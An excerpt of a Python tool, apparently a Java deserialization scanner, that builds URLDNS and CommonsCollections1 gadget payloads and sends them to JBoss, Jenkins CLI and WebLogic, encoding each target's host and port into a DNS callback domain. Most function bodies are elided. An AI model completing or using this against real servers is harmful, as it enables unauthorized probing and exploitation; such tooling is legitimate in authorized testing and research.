...
def build_dns_gadget_cc1(dns_host):
    """
...
def build_dns_gadget_urldns(dns_host):
    """
...
def send_payload_jboss(host,port,dns_suffix):
    ...
    rawBody = build_dns_gadget_urldns(hexlify(str(random.randint(10, 999))+":jboss:"+host+":"+port)+"."+dns_suffix)
...
def send_payload_jenkins_cli(host,port,dns_suffix):
    ...
    payloadObj = build_dns_gadget_urldns(hexlify(str(random.randint(10, 999))+":jenkins-cli:"+host+":"+port)+"."+dns_suffix)
...
def send_payload_weblogic(host,port,dns_suffix):
    ...
    payloadObj = build_dns_gadget_urldns(hexlify(str(random.randint(10, 999))+":weblogic:"+host+":"+port)+"."+dns_suffix)
